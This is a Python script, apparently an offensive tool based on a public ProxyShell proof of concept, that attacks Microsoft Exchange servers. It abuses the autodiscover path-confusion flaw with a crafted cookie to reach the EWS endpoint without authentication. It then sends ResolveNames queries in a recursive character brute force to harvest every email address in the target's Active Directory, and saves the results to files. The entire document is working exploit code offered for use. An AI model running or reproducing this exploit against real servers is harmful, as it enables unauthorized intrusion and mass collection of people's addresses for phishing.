#!/usr/bin/env python3
# author: ewater
# ref: https://github.com/dmaasland/proxyshell-poc

import argparse
import random
import string
import requests
import sys
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
from string import Template

all = "abcdefghijklmnopqrstuvwxyz0123456789.-_"
alphanumber = "abcdefghijklmnopqrstuvwxyz0123456789"
alpha = "abcdefghijklmnopqrstuvwxyz"

def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-c', help='charset: all, alpha, alphanum, not default charset then search the keyword', required=False, default='all')
    #parser.add_argument('-l', help='try a list', required=False)
    return parser.parse_args()


def get_emails(url, searchString):

    domain = url
    random_email = f'{rand_string(5)}@{rand_string(3)}.{rand_string(2)}'
    dataTemplate = Template('''
        <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>$searchString</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>

</soap:Envelope>
    ''')
    data = dataTemplate.substitute(searchString=searchString)
    headers = {
        'Content-Type': 'text/xml',
        'Cookie': f'Email=autodiscover/autodiscover.json?a={random_email}'
    }

    url = f"https://{domain}/autodiscover/autodiscover.json?a={random_email}/EWS/exchange.asmx"
    #r = requests.post(url=url,data=data, headers=headers, verify=False, proxies={'https':'192.168.252.1:8080'})
    r = requests.post(url=url,data=data, headers=headers, verify=False)
    response_xml = ET.fromstring(r.content)
    emails = response_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress'
    )
    '''
    names = response_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}Name'
    )
    departments = response_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Contact/{*}Department'
    )
    jobtitles = response_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Contact/{*}JobTitle'
    )
    '''
    site = urlparse(url).netloc
    filename = f"{site}.txt"
    filepath = f"temp/{filename}"
    with open(filepath, 'a') as the_file:
        for email in emails:
            if email.text == None:
                pass
            else:
                print(f'Found address: {email.text}')
                the_file.write(f"{email.text}\n")
    return emails


def findAllEmail(searchString, charset, proxyshell):

    for i in charset:
        searchStr = searchString + i
        print(searchStr)
        emails = get_emails(proxyshell, searchStr)
        if len(emails) == 100 :
            print("result more than 100, search deeper...")
            findAllEmail(searchStr, charset, proxyshell)


def refineTxt(filename):

    print("refine result start")
    outfilename = filename
    with open(f"output/{outfilename}","w") as outs:
        with open(f"temp/{filename}", "r") as lines:
            refine = sorted(set(lines.readlines()))
        print(f"refine lines count: {str(len(refine))}")
        outs.writelines(refine)
    print("refine txt file, sort and unique done")


def main():

    args = get_args()
    domain = args.u
    
    if args.c == "alpha":
        charset = alpha
    elif args.c == "alphanumber":
        charset = alphanumber
    elif args.c == "all":
        charset = all
    else:
        charset = args.c
        get_emails(domain, charset)
        print(f"search done, result at: temp/{domain}.txt")
        exit()
    smtpemails = get_emails(domain, "SMTP:")
    if len(smtpemails) == 100:
        # email maybe > 100
        print("First search find 100 email, let's find more")
        findAllEmail('', charset, domain)
    refineTxt(f"{domain}.txt")
    print(f"all done, result at: output/{domain}.txt")


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(
            sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    main()
